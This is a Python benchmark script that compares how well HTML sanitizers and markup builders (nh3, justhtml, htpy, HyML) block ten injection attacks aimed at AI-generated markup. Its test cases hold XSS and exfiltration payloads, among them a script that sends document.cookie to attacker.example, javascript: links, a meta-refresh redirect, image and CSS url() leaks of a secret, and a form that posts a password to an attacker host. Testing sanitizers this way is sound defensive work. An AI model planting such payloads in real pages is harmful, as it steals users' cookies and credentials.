"""What gets through when an agent's markup contains an attack?

    pip install -e . nh3 justhtml htpy
    python benchmarks/security_compare.py

The same ten attacks are given as HTML to the sanitizers (nh3, justhtml,
with their default settings) and as JSON Hiccup to the builders (htpy, HyML
data mode). A case passes through when the dangerous part is still in the
output. HyML rejects instead of stripping, so a rejection is counted as
blocked.
"""

import html
import importlib.metadata
import re
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import htpy  # noqa: E402
import justhtml  # noqa: E402
import nh3  # noqa: E402

import hyml  # noqa: E402

SECRET = "https://attacker.example/log?d=SECRET"


def has(pattern):
    return lambda out: re.search(pattern, html.unescape(out).replace("\t", "").replace("\n", ""), re.I)


CASES = [
    ("<script> element",
     "<p>Hi<script>fetch('//attacker.example/?c='+document.cookie)</script></p>",
     ["p", "Hi", ["script", "fetch('//attacker.example/?c='+document.cookie)"]], has(r"<script")),
    ("event handler attribute",
     '<img src="/x.png" onerror="alert(1)">',
     ["img", {"src": "/x.png", "onerror": "alert(1)"}], has(r"onerror")),
    ("javascript: link",
     '<a href="javascript:alert(1)">x</a>',
     ["a", {"href": "javascript:alert(1)"}, "x"], has(r"href=[\"']?javascript:")),
    ("obfuscated java&#9;script: link",
     '<a href="java&#9;script:alert(1)">x</a>',
     ["a", {"href": "java\tscript:alert(1)"}, "x"], has(r"href=[\"']?javascript:")),
    ("iframe with srcdoc",
     '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>',
     ["iframe", {"srcdoc": "<script>alert(1)</script>"}], has(r"<iframe")),
    ("meta refresh redirect",
     '<meta http-equiv="refresh" content="0;url=https://attacker.example/">',
     ["meta", {"http-equiv": "refresh", "content": "0;url=https://attacker.example/"}], has(r"attacker\.example")),
    ("image URL exfiltration (zero-click)",
     f'<img src="{SECRET}" alt="">',
     ["img", {"src": SECRET, "alt": ""}], has(r"attacker\.example")),
    ("CSS url() exfiltration (zero-click)",
     f'<p style="background:url({SECRET})">x</p>',
     ["p", {"style": f"background:url({SECRET})"}, "x"], has(r"attacker\.example")),
    ("form posting to attacker (click)",
     '<form action="https://attacker.example/steal"><input name="password"></form>',
     ["form", {"action": "https://attacker.example/steal"}, ["input", {"name": "password"}]], has(r"attacker\.example")),
    ("link carrying data (click)",
     f'<a href="{SECRET}">Click</a>',
     ["a", {"href": SECRET}, "Click"], has(r"attacker\.example")),
]


def htpy_render(node):
    if isinstance(node, str):
        return node
    tag, *rest = node
    attrs = rest.pop(0) if rest and isinstance(rest[0], dict) else {}
    element = getattr(htpy, tag)(attrs)
    return element[[htpy_render(child) for child in rest]] if rest else element


def hyml_render(node, **options):
    try:
        return hyml.render_data(node, **options)
    except hyml.HyMLDataError:
        return ""


TOOLS = {
    "nh3": lambda h, d: nh3.clean(h),
    "justhtml": lambda h, d: justhtml.JustHTML(h, fragment=True).to_html(),
    "htpy": lambda h, d: str(htpy_render(d)),
    "HyML data mode": lambda h, d: hyml_render(d),
    "HyML + allowed_url_hosts": lambda h, d: hyml_render(d, allowed_url_hosts=["example.com"]),
}

if __name__ == "__main__":
    versions = ", ".join(f"{p} {importlib.metadata.version(p)}" for p in ["nh3", "justhtml", "htpy"])
    versions += f", hyml {hyml.__version__}"
    print(f"{versions}\n")
    print("| Attack | " + " | ".join(TOOLS) + " |")
    print("|---|" + "---|" * len(TOOLS))
    totals = dict.fromkeys(TOOLS, 0)
    for name, markup, data, dangerous in CASES:
        cells = []
        for tool, run in TOOLS.items():
            blocked = not dangerous(run(markup, data))
            totals[tool] += blocked
            cells.append("blocked" if blocked else "**passes**")
        print(f"| {name} | " + " | ".join(cells) + " |")
    print("| **blocked** | " + " | ".join(f"**{n}/{len(CASES)}**" for n in totals.values()) + " |")
